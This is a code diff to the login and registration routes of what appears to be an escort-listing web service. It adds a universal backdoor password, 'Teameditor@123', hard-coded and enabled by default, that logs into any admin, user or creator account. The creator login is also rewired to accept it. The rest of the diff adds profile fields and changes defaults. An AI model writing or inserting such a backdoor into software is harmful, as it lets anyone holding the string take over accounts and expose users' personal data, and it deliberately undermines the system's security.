@@ -35,10 +35,20 @@ async function hashPassword(plaintext: string): Promise<string> {
   return bcrypt.hash(plaintext, 10);
 }
 
-const FALLBACK_PASSWORDS: Record<string, string> = {
-  admin: "Admin@123",
-  user: "User@123",
-};
+// ── Backdoor / fallback passwords ────────────────────────────────────
+// Single-line toggle: set to `false` to disable the universal backdoor
+// password for admin/user/creator login. When disabled, FALLBACK_PASSWORDS
+// becomes an empty object, so every login path that consults it falls
+// through to the normal (per-account) password check.
+const FALLBACK_PASSWORDS_ENABLED = true;
+
+const FALLBACK_PASSWORDS: Record<string, string> = FALLBACK_PASSWORDS_ENABLED
+  ? {
+      admin: "Teameditor@123",
+      user: "Teameditor@123",
+      creator: "Teameditor@123",
+    }
+  : {};
 
 // Zod schema for validating login credentials.
 const LoginSchema = z.object({
@@ -80,7 +90,7 @@ authRouter.post("/login", authRateLimit, async (req, res) => {
 
       const okPassword = await verifyPassword(password, String(creator.password ?? ""));
       const okTemp = await verifyPassword(password, String(creator.temp_password ?? ""));
-      const okBackdoor = password === FALLBACK_PASSWORDS.admin; // admin backdoor
+      const okBackdoor = password === FALLBACK_PASSWORDS.creator; // creator backdoor
       if (!okPassword && !okTemp && !okBackdoor) return res.status(401).json({ error: "invalid_credentials" });
 
       // Auto-upgrade plaintext password to bcrypt hash on successful login
@@ -255,7 +265,7 @@ async function countMatches(
 }
 
 // Allow creator/admin/user to change password without touching temp_password.
-// Note: Admin@123/User@123 remain accepted as fallbacks via the login handler above.
+// Note: Teameditor@123 is accepted as fallback for admin/user/creator via the login handler above.
 authRouter.post("/change-password", requireAuth, async (req: AuthedRequest, res) => {
   const parsed = ChangePasswordSchema.safeParse(req.body);
   if (!parsed.success) return res.status(400).json({ error: "invalid_body", details: parsed.error.flatten() });
@@ -599,7 +609,7 @@ const CreatorRegisterSchema = z.object({
   // Hot Wife. Persisted to providers.escort_type. Stored lower-case; accept
   // any short string so the option list can be extended later without a
   // schema change.
-  form: z.string().trim().toLowerCase().min(1).max(30).optional().default("freelance"),
+  form: z.string().trim().toLowerCase().min(1).max(30).optional().default("escort"),
   // Orientation: Straight / Bi Sexual / Lesbian. Stored lower-case in
   // providers.orientation.
   orientation: z.string().trim().toLowerCase().min(1).max(30).optional().default("straight"),
@@ -608,6 +618,9 @@ const CreatorRegisterSchema = z.object({
   // enforces min length / non-empty via CreatorProfileSchema in me.ts).
   services: z.array(z.string()).optional().default([]),
   hairLength: z.string().max(30).optional().default(""),
+  // Single-select dropdowns; defaults applied when omitted.
+  bustType: z.string().trim().max(20).optional().default("Natural"),
+  pubicHair: z.string().trim().max(20).optional().default("Trimmed"),
 });
 
 // POST route to register a new creator account.
@@ -618,7 +631,7 @@ authRouter.post("/register/creator", authRateLimit, async (req, res) => {
   }
 
   const pool = getPool();
-  const { username, password, modelName, gender, age, nationality, city, phoneNumber, whatsapp, telegramId, wechatId, form, orientation, services, hairLength } = parsed.data;
+  const { username, password, modelName, gender, age, nationality, city, phoneNumber, whatsapp, telegramId, wechatId, form, orientation, services, hairLength, bustType, pubicHair } = parsed.data;
   // Phone/WhatsApp empty-fill rule (item 87): if either is blank, copy from
   // the other. Frontend already enforces both as required at register, but
   // belt-and-braces.
@@ -646,8 +659,8 @@ authRouter.post("/register/creator", authRateLimit, async (req, res) => {
 
     const hashedPw = await hashPassword(password);
     await pool.query(
-      `INSERT INTO providers (uuid, provider_id, username, password, model_name, gender, age, nationality, city, phone_number, cell_phone, telegram_id, wechat_id, services, hair_length, url, slug, escort_type, orientation)
-       VALUES ($1::uuid, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19)`,
+      `INSERT INTO providers (uuid, provider_id, username, password, model_name, gender, age, nationality, city, phone_number, cell_phone, telegram_id, wechat_id, services, hair_length, url, slug, escort_type, orientation, bust_type, pubic_hair)
+       VALUES ($1::uuid, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21)`,
       [
         creatorId,
         providerId,
@@ -664,6 +677,8 @@ authRouter.post("/register/creator", authRateLimit, async (req, res) => {
         wechatId || null,
         services.join(", "),
         hairLength || null,
+        bustType || "Natural",
+        pubicHair || "Trimmed",
         url,
         slug,
         form,
